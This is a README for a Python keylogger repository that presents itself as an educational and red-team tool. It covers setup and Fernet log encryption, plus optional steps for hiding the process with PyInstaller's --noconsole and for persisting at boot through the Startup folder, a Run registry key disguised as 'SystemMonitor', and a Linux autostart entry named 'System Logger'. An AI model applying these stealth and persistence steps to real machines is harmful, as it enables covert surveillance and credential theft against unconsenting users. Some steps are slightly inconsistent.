#  Python Keylogger
**A cross platform keylogger built for educational purposes, red-team simulation, and encryption practice.**
Logs keystrokes, captures active window titles, and encrypts logs with Fernet.

> **DISCLAIMER:** This tool is intended for ethical hacking labs and educational use **only**. Do **not** deploy on unauthorized systems.

---

## Features
-  Captures all keystrokes
-  Detects active window titles (Windows + Linux)
-  Decrypts logs using Fernet's `cryptography`
-  Cross-platform (Windows & Linux)
-  Clean modular Python code

---

## Folder Structure
<pre>
  keylogger/
  ├── src/
  │ ├── keylogger.py         # Main logger
  │ ├── encryptor.py         # Encrypts logs
  │ ├── generate_key.py      # Creates Fernet key
  │ ├── config.py            # Paths & key loader
  │ └── utils/window_info.py # Active window grabber
  ├── logs/                  # Keystroke logs
  ├── fernet.key             # Secret key
  ├── requirements.txt
  ├── .gitignore
  └── README.md
</pre>

---

## Setup
### 1.  Clone the Repo
```bash
git clone https://github.com/hassanmajaro/keylogger.git
cd keylogger
```

### 2.  Create a Virtual Environment
```bash
python -m venv venv
venv\Scripts\activate          # Windows
# source venv/bin/activate     # Linux/macOS
```

### 3.  Install Requirements
```bash
pip install -r requirements.txt
```
> **Note for Linux users: install xdotool if not already installed:
```bash
sudo apt install xdotool
```

### 4.  Generate Your Encryption Key
```bash
python src/generate_key.py
```
This will create fernet.key in the root directory

### 5.  Run the keylogger
```bash
python src/encryptor.py
```
-  Open other apps and type - the keystrokes and active window will be logged in `logs/keylog.txt`.

### 6.  Encrypt the Log File
```bash
python src/encryptor.py
```
-  Outputs an encrypted version: `keylog.txt.enc`

## Sample Log Output
```yaml
2025-05-08 01:21:45,200: [Window: Notepad]
H
e
l
l
o
```

---

## Optional: Compile to .exe (Windows Only)
If you'd like to simulate stealthier execution on Windows:

### 1.  Install PyInstaller
```bash
pip install pyinstaller
```

### 2.  Compile the Keylogger
```bash
pyinstaller --onefile --noconsole src/keylogger.py
```
-  --onefile: Bundles everything into a single .exe
-  --noconsole: Prevents the command prompt window from showing

### 3.  Locate the Executable
Your compiled file will be inside the `dist/` folder as:
```
dist/keylogger.exe
```

---

## Optional: Auto-Start on Boot (Windows - for .exe)
### Method 1: Add to Startup Folder
```bash
Win + R --> type: shell:startup
```
-  Copy `dist/keylogger.exe` into this folder.

### Method 2: Registry Persistence
1.  Press `Win + R`, type `regedit`
2.  Navigate to:
   ```
    HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
   ```
3.  Right-click --> **New > String Value**
4.  Name: `SystemMonitor`
5.  Value: Full path to `keylogger.exe`, e.g.:
   ```
    C:\Users\YourUser\AppData\Roaming\keylogger.exe
   ```

## Linux (for Python Script)
### Method 1: Use `~/.config/autostart`
1.  Create an autostart `.desktop` file:
    ```bash
    mkdir -p ~/.config/autostart
    nano ~/.config/autostart/keylogger.desktop
2.  Add the following:
    ```ini
    [Desktop Entry]
    Type=Application
    Exec=python3 /path/to/your/src/keylogger.py
    Hidden=false
    NoDisplay=false
    X-GNOME-Autostart-enabled=true
    Name=System Logger
    ```
3.  Save and exit (Crtl + O, then Ctrl + X)

---

## Author
Built by **Hassan Majaro** 

Cybersecurity Enthusiast | Certified Information Security Consultant (CISC)

---

## LICENSE
MIT License
